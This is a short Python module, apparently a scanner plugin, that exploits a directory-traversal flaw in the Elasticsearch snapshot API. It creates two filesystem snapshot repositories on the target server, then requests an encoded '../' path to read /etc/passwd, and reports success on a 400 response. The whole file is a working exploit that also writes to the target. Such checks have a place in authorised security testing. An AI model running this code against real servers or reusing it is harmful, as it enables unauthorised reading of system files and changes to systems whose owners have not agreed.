import json
from typing import Optional

import requests

from lib.log import logger


def run(url: str, port: int) -> Optional[str]:
    address = f"{url}:{port}"
    try:
        # Step 1
        data = {"type": "fs", "settings": {"location": "/usr/share/elasticsearch/repo/test"}}
        resp = requests.put(f"{address}/_snapshot/test", data=json.dumps(data), timeout=9, verify=False)
        if '"accepted": true' in resp.text and resp.status_code == 200:
            # Step 2
            data2 = {"type": "fs", "settings": {"location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"}}
            resp2 = requests.put(f"{address}/_snapshot/test2", data=json.dumps(data2), timeout=9, verify=False)
            if '"accepted": true' in resp2.text and resp2.status_code == 200:
                # Step 3
                trav = f"{address}/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
                resp3 = requests.get(trav, timeout=9, verify=False)
                if resp3.status_code == 400:
                    return "reading /etc/passwd"
                logger.warning(f"Traversal failed, status code: {resp3.status_code}")
                return None
        logger.warning("Backup or snapshot creation failed")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
